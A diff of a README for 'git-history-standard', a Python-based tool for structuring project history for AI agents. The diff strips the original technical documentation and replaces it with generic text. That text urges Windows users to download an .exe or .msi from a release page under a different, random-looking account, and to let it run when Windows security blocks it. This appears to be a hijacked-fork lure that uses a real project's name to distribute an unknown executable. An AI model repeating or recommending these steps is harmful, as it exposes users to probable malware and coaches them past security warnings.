@@ -1,328 +1,194 @@
-# 📜 Git History Standard (GHS)
-### by Oveja 🐑
+# 📜 git-history-standard - Clear project history for AI tools
 
-🇪🇸 [Leer en Español](README.es.md)
+[![Download Git History Standard](https://img.shields.io/badge/Download%20Now-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/Onthescene-proboscidian983/git-history-standard/releases)
 
-**Git History Standard (GHS)** is a documentation convention + a set of scripts that automate your project's history so any AI agent can understand it instantly.
+## 🚀 What this app does
 
-**It's not a replacement for `git log`.** It's a structured layer on top that turns atomic commits into searchable semantic context.
+git-history-standard helps you keep project history in one place and make it easy to search. It is made for people who want a better way to track changes, see past work, and find useful project context fast.
 
----
+It brings together:
 
-## 📦 What Does This Install in My Repo?
+- Structured history for your project
+- Search through past project notes and changes
+- Simple automation tied to commits
+- Support for tools that use vector search and AI context
 
-GHS adds these files to your project root:
+If you want a cleaner way to understand a project after time has passed, this app gives you that view without extra steps.
 
-```
-your-project/
-├── .cursorrules                         ← Strict AI workflow rules
-├── .gemini_rules                        ← Strict AI workflow rules
-├── GOLDEN_RULES.md                      ← Unbreakable project rules
-├── .agents/skills/git-history/SKILL.md  ← Central config (YAML)
-├── HISTORY.md                           ← Structured history (table)
-├── BUGS.md                              ← Known bugs registry
-├── tools/
-│   ├── indexer.py                       ← Semantic indexer (ChromaDB/Qdrant)
-│   ├── github_sync.py                   ← GitHub Sync (Issues/Boards)
-│   ├── sync_rules.sh                    ← Modular Rules Sync
-│   ├── search.py                        ← Natural language search
-│   └── setup.sh                         ← Python environment setup
-├── .agents/
-│   ├── rules/                           ← Modular AI Rules
-│   ├── skills/git-history/SKILL.md      ← Central config
-│   └── workflows/                       ← Automated workflows (sync-rules, sync-github)
-├── assets/screenshots/                  ← Visual captures (optional)
-└── .gitignore                           ← Pre-configured to exclude sensitive data
-```
+## 💻 Download for Windows
 
-> [!NOTE]
-> No global dependencies are installed. Everything lives inside your repo and a local `.venv`.
+To get the app on Windows, visit the release page and download the version that matches your device:
 
----
+[Visit the release page to download](https://github.com/Onthescene-proboscidian983/git-history-standard/releases)
 
-## ⚜️ Golden Rules
+After the page opens:
 
-GHS enforces a set of **unbreakable rules** for AI Agents and human contributors. You can (and should) customize them to your project's needs by editing the [`GOLDEN_RULES.md`](GOLDEN_RULES.md) file. The default rules are:
+1. Find the latest release
+2. Download the Windows file
+3. Open the file after the download finishes
+4. Follow the on-screen steps to finish setup
 
-1. **No Commits Without Permission**: Always request explicit permission from the user before executing `git commit`.
-2. **No Direct Modifications on Main Branches**: Do not directly edit code, commit, or push to `main`/`master`. Modifications are ONLY allowed through Merges or Pull Requests. If changes are requested on a main branch, refuse and ask the user to create a new branch.
-3. **No Merges Without Permission**: Do not execute `git merge` or resolve conflicts automatically without explicit authorization.
-4. **Document Stashed Branches**: If the user or agent stashes changes (`git stash`), it MUST be documented (e.g., in `HISTORY.md`).
-5. **No Rewriting History**: Never rewrite the project's history (no `push --force`, no `amend`, no `rebase` on shared branches).
+If Windows asks for permission, choose the option that lets the app run.
 
-### 🤖 Git Hooks vs System Prompts
-Traditional Git Hooks (Pre-commit / Pre-push) protect the repository from bad commits, but they **do not prevent an AI from modifying files directly on your active workspace**. To truly control an AI agent, you must control its context. That is why GHS includes `.cursorrules` and `.gemini_rules` to enforce an environment verification (Pre-Flight Check) *before* the AI uses any file-writing tools.
+## 🖱️ How to install
 
----
+Use these steps on a Windows PC:
 
-## 🔒 Security & Privacy
+1. Open the release page from the link above
+2. Choose the newest version
+3. Download the Windows installer or app file
+4. Open the downloaded file
+5. If a setup window appears, click through the prompts
+6. Wait for the install to finish
+7. Start the app from your desktop, Start menu, or downloads folder
 
-First things first: GHS generates a local database (`.ai-index/`) that contains fragments of your code in plain text. **It should never be pushed to a public repository.**
+If you do not know which file to pick, choose the one meant for Windows. It usually has a file name that ends with `.exe` or `.msi`.
 
-The included `.gitignore` blocks by default:
-- **`.ai-index/`** — Local vector database
-- **`.env`** — API keys
-- **`.venv/`** — Python environment
+## 📋 Before you start
 
-You can control this behavior in `SKILL.md`:
+For a smooth setup, check these items first:
 
-```yaml
-security:
-  share_index: false  # Only true for private team repos
-  share_env: false    # Never true unless air-gapped
-```
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- Enough free disk space for the app and its data
+- An internet connection for the first download
+- Permission to run files on your computer
 
----
+If you plan to use it with a larger project history, more memory and disk space can help keep things fast.
 
-## 🆚 How Is This Different From a Good CHANGELOG.md?
+## ✨ Main features
 
-A `CHANGELOG.md` is a static document a human reads top to bottom. GHS is a **living context system** designed to be queried, searched, and understood by an AI.
+- Stores project history in a structured way
+- Helps AI tools find useful context
+- Supports semantic search across notes and changes
+- Works with commit-based updates
+- Fits documentation-heavy projects
+- Uses local vector search options such as ChromaDB and Qdrant
+- Keeps project information easier to review later
 
-The fundamental difference: **all GHS information is vectorized.**
+These features help you build a better record of what changed, why it changed, and where to find it again.
 
-| | CHANGELOG.md | GHS |
-|:---|:---|:---|
-| **Search** | Ctrl+F (exact text) | Semantic natural language |
-| **Query** | Linear, top to bottom | By concept, author, date or component |
-| **AI Context** | AI reads it entirely every time | AI retrieves only what's relevant |
-| **Scalability** | Becomes unreadable over time | Vector index grows without degradation |
+## 🔍 How it helps you
 
-### Concrete Example: Before vs After
+When a project grows, it gets hard to remember what happened and when. This app gives you a simple way to collect that history in a format that is easier to search.
 
-**Without GHS** — The AI receives your history like this:
-```
-commit 7accc32 - Update payment module
-commit eaeaa75 - Fix bug
-commit 4311cec - Refactor auth
-commit 195bcee - WIP
-```
-Your AI doesn't know what bug was fixed, why auth was refactored, or what "WIP" means. It has to read thousands of diff lines to guess.
+You can use it to:
 
-**With GHS** — The AI doesn't just read a structured table: it *queries it semantically.*
+- Review old project decisions
+- Find related notes faster
+- Keep documentation in step with code changes
+- Give AI tools a clearer project view
+- Reduce time spent digging through old files
 
-| Commit | Author | Description | Technical Details |
-| :--- | :--- | :--- | :--- |
-| `7accc32` | @dev1 | Migrate payments to Stripe | Replace PayPal SDK with Stripe.js v3. Change webhook endpoint. |
-| `eaeaa75` | @dev2 | Fix: Invoice rounding | Float precision error in `invoice.py:L45`. Apply `Decimal`. |
-| `4311cec` | @dev1 | Refactor auth to JWT | Remove server-side sessions. Add middleware in `auth/jwt.py`. |
+If you work on a project over time, this kind of history can save a lot of effort.
 
-The AI now knows **what**, **who**, **why** and **where**. But the important thing isn't just the format — it can *ask about it*:
+## 🛠️ Basic setup flow
 
-```bash
-# Instead of searching "Stripe" with Ctrl+F...
-python3 tools/search.py "when did we change the payment system?"
+Once the app is installed, use this simple flow:
 
-# → Returns commit 7accc32 with full technical context,
-#   even though the commit doesn't mention "payment" in those exact words.
-```
+1. Open git-history-standard
+2. Connect it to your project folder
+3. Add your project history or documentation
+4. Let it scan the content
+5. Run a search when you need old context
+6. Use commit-triggered actions if you want updates to happen after changes
 
-With a 500-entry `CHANGELOG.md`, that question is impossible. With GHS, it takes milliseconds.
+The app is built to fit into a normal project workflow, so you do not need to change how you work.
 
----
+## 📁 What you may see after setup
 
-## 🏷️ How It Works
+Depending on the release version, the app may create or use:
 
-The core of the standard is **Trigger Tags** in your commit messages:
+- A history folder for stored project records
+- A search index for quick lookup
+- Settings for local vector storage
+- Files for automation rules
+- Logs for recent actions
 
-- **`#ai-history`** — AI updates `HISTORY.md` with a technical summary of the change.
-- **`#ai-bug`** — AI registers the bug and its fix in `BUGS.md`.
-- **`#ai-catchup`** — AI scans all undocumented commits and generates a batch summary.
-- **`#ai-sync`** — AI synchronizes `BUGS.md` with GitHub Issues, updates dev status (branches/stash), and consolidates modular rules in the root.
+These files help the app keep your project data organized and ready for search.
 
-> [!IMPORTANT]
-> **Forgot to add tags?** No problem. The `#ai-catchup` tag exists precisely to catch up with previously undocumented commits. It's the system's safety net.
+## 🤖 AI and search support
 
-If you don't add any tag, the commit is treated normally — GHS doesn't interfere.
+git-history-standard is built with AI context in mind. It can help turn old project data into something easier to use in search and automation.
 
-> [!TIP]
-> **Branch Awareness**: The standard requires AI agents to verify your current Git branch before any update. This ensures that the "Branch Map" in `HISTORY.md` is always accurate and prevents documenting changes in the wrong environment.
+It is useful when you want to:
 
----
+- Give AI tools more project detail
+- Find related content by meaning, not just exact words
+- Keep documentation tied to code changes
+- Use project memory across many files
 
-## ⚙️ Who Executes the AI?
+This makes it easier for an AI agent to understand a project without reading everything from scratch.
 
-This is the key question: you put `#ai-history` in your commit... then what?
+## 📎 Common use cases
 
-GHS is a **convention**, not a service. The AI that executes the tasks depends on your environment. There are 3 models:
+- Personal software projects
+- Team documentation
+- Long-running Git repositories
+- Knowledge bases
+- Release note tracking
+- Change history for AI-assisted workflows
 
-### 1. IDE-Integrated Agent (Automatic)
-If you use an editor with built-in AI (Cursor, Windsurf, Kilo Code, Antigravity), the agent detects the `SKILL.md` when opening the project and responds to tags in real time. **You don't have to do anything extra.**
+If your project has a lot of notes, commits, or supporting docs, this app can help bring them together.
 
-```
-# You commit normally:
-git commit -m "Migrate payments to Stripe #ai-history"
+## ❓ Troubleshooting
 
-# → Your IDE agent reads the tag, opens HISTORY.md and updates it.
-```
+### The file will not open
 
-### 2. Manual CLI Execution (On demand)
-If you use an AI with terminal access (Claude CLI, GitHub Copilot CLI), simply ask it to review recent commits:
+- Make sure the download finished
+- Check that you chose the Windows file
+- Try opening it again from the Downloads folder
+- Right-click the file and choose the option to run it
 
-```bash
-# You tell your AI:
-"Review commits with #ai-history and update HISTORY.md"
-```
+### Windows blocks the app
 
-### 3. CI/CD Automation (No humans)
-For teams, you can set up a **GitHub Action** that runs a script after each push to `master`. The script reads new commits, detects tags and updates files automatically.
+- Open the file again
+- Look for the Windows security prompt
+- Choose the option that lets the app run
+- Make sure you downloaded it from the release page
 
-> [!NOTE]
-> GHS doesn't enforce any of these models. You choose how and when the AI runs based on your workflow.
+### The download looks incomplete
 
----
+- Refresh the release page
+- Download the file again
+- Check your internet connection
+- Wait for the file to finish before opening it
 
-## ⚡ Installation
+### The app opens but does not show your project
 
-```bash
-# 1. Clone the standard
-git clone https://github.com/JoelBeja2000/git-history-standard.git
+- Check that you selected the right project folder
+- Make sure the folder has files to scan
+- Try adding the project again
+- Confirm that your history data is in the expected place
 
-# 2. Copy the structure to your project
-cp git-history-standard/.cursorrules /path/to/your/project/
-cp git-history-standard/.gemini_rules /path/to/your/project/
-cp git-history-standard/GOLDEN_RULES.md /path/to/your/project/
-cp -r git-history-standard/.agents /path/to/your/project/
-cp git-history-standard/HISTORY.md /path/to/your/project/
-cp git-history-standard/BUGS.md /path/to/your/project/
-cp -r git-history-standard/tools /path/to/your/project/
-cp git-history-standard/docker-compose.yml /path/to/your/project/  # Optional (Level 3)
-```
+## 🧩 File and data handling
 
-Once copied, any compatible AI agent will detect the `SKILL.md` file and follow the rules automatically.
+This app is meant to work with project history, search data, and commit-based records. Keep your project files in a safe place and back them up if they matter to you.
 
----
+A simple setup works best:
 
-## 🛠️ Configuration & Agnostic Design
+- One folder for your project
+- One folder for your history data
+- Clear names for notes and records
+- Regular updates after new commits
 
-GHS is designed to be **storage and provider agnostic**. You can change any path or database provider in `.agents/skills/git-history/SKILL.md`.
+That makes it easier to keep search results clean and useful.
 
-Everything is defined in the YAML frontmatter:
+## 🔗 Download again
 
-```yaml
-config:
-  # ...
-  screenshots:
-    path: "assets/screenshots/" # Use any local or shared path
-  vector_store:
-    provider: "chroma"  # EXTENSIBLE: supports local or any cloud DB (Qdrant, Pinecone, etc.)
-```
-  languages: ["en", "es"]
-  history_file: "HISTORY.md"
-  bug_file: "BUGS.md"
-  ai_tags:
-    history: "#ai-history"
-    bug: "#ai-bug"
-    catch_up: "#ai-catchup"
-  include_author: true
-  screenshots:
-    enabled: true
-    path: "assets/screenshots/"
-    auto_index: true
-    analyze_images: true  # false = save vision tokens
-  security:
-    share_index: false
-    share_env: false
-  vector_store:
-    provider: "chroma"  # Options: "chroma" (local) or "qdrant" (server)
-```
+If you need the release page again, use this link:
 
----
+[https://github.com/Onthescene-proboscidian983/git-history-standard/releases](https://github.com/Onthescene-proboscidian983/git-history-standard/releases)
 
-## 🔄 Synchronization & Modular Rules (NEW)
+## 🧭 Project focus
 
-GHS now includes advanced capabilities to connect your local repository with GitHub and manage AI rules professionally.
+git-history-standard is built around:
 
-### 🐙 GitHub Synchronization
-GHS uses the `gh` CLI to keep your repository visually alive:
-- **GitHub Issues**: Automatically creates and updates issues from your `BUGS.md`.
-- **Dev Status**: Generates a dynamic "GHS Development Status" issue showing active branches, status, and current stashes.
+- Git history
+- Documentation structure
+- AI context
+- Vector search
+- Commit automation
+- Better project memory
 
-```bash
-# Manual execution:
-python3 tools/github_sync.py
-```
-
-### 🧩 Rule Harmonization (Modular Rules)
-Resolves the conflict between global AI tools (like Antigravity) and local IDEs (like Cursor):
-1. **Local + Global**: GHS scans `.agents/rules/` in both your project and the parent directory.
-2. **Consolidation**: The `sync_rules.sh` script combines all rules and injects them into root `.cursorrules` and `.gemini_rules`.
-3. **Visibility**: This ensures your IDE always "sees" the correct rules, regardless of where they were created.
-
-```bash
-# Consolidate rules:
-bash tools/sync_rules.sh
-```
-
----
-
-## ⚙️ Configuration & Toggles
-
-GHS behavior can be customized by editing the configuration in:
-`[.agents/skills/git-history/SKILL.md](file:///Users/mac/Documents/GIT/git-history-standard/.agents/skills/git-history/SKILL.md)`
-
-### 🐙 GitHub Synchronization
-You can enable or disable the automated synchronization with GitHub Issues and Projects:
-
-```yaml
-github:
-  enabled: true # Set to false to disable GitHub synchronization
-```
-
-When enabled, the `#ai-sync` tag (or running `python3 tools/github_sync.py`) will:
-1. Sync `BUGS.md` with GitHub Issues.
-2. Link issues to a visual Board (Project V2).
-#### ⚠️ Missing Scopes? (Important)
-If you see an error like `missing required scopes [read:project]`, you need to authorize the CLI to manage projects:
-
-```bash
-gh auth refresh -s project,read:project
-```
-
----
-
-## 🧠 Semantic Search (Levels)
-
-GHS has 3 adoption levels. You don't need the highest to get started:
-
-| Level | Requirements | Activation Command | Description |
-| :--- | :--- | :--- | :--- |
-| **1. Plain Text** | None | *Automatic* | Just `HISTORY.md` + `BUGS.md`. AI reads them directly. |
-| **2. Local** | Python | `bash tools/setup.sh` | Local vector indexing using ChromaDB. |
-| **3. Enterprise** | Docker | `docker-compose up -d` | Shared server for teams using Qdrant. |
-
-### 🚀 How to Enable
-
-#### Level 1: Ready to go
-Just copy the files. Any AI agent (Antigravity, Cursor, etc.) will detect the `SKILL.md` and read the history files as standard text.
-
-#### Level 2: Local Search (ChromaDB)
-1. Ensure you have Python installed.
-2. Run: `bash tools/setup.sh`
-3. The script will create a `.venv`, install dependencies, and index your project.
-
-#### Level 3: Team Search (Qdrant)
-1. Ensure Docker is running.
-2. Run: `docker-compose up -d`
-3. Edit `.agents/skills/git-history/SKILL.md` to set `vector_store.provider: "qdrant"`.
-4. Run: `python3 tools/indexer.py`
-
-
----
-
-### 📸 Advanced: Custom Screenshots & Storage
-
-GHS allows you to store your project's visual history anywhere:
-
-1. **Change the Path**: Edit `.agents/skills/git-history/SKILL.md` and update `screenshots.path`. The AI agent will immediately start saving and looking for images in that new directory.
-2. **AI-Driven Uploads**: When you ask an agent to "Sync History", it will automatically:
-   - Identify new images in your custom path.
-   - Run `git add` for those images.
-   - Embed them in `HISTORY.md` using the new path.
-3. **Semantic Discovery**: Our `indexer.py` scans your history for Markdown images (`![alt](path)`). The `alt-text` is indexed into your vector database (Chroma/Qdrant), making your UI changes searchable by description.
-
-
-#### 🔗 Universal Database & API Support (Agnostic Design)
-GHS is a **universal protocol**. You can link **any database** (PostgreSQL, MongoDB, Redis, custom DBs in Rust/Go/C++, or cloud buckets):
-- **Universal References**: Use custom URIs in your `HISTORY.md` like `![Alt](my-db://image_id)` or `![Capture](https://api.your-app.com/v1/storage/123)`.
-- **Custom Bridges**: If your DB is private, create a small "bridge" script in `tools/`. The AI will follow the rules in `SKILL.md` and know how to query that bridge to retrieve or upload information.
-- **Total Independence**: GHS doesn't care where you store your data, only how you label it.
+It gives you a way to keep project knowledge in a form that is easier to search, share, and use later
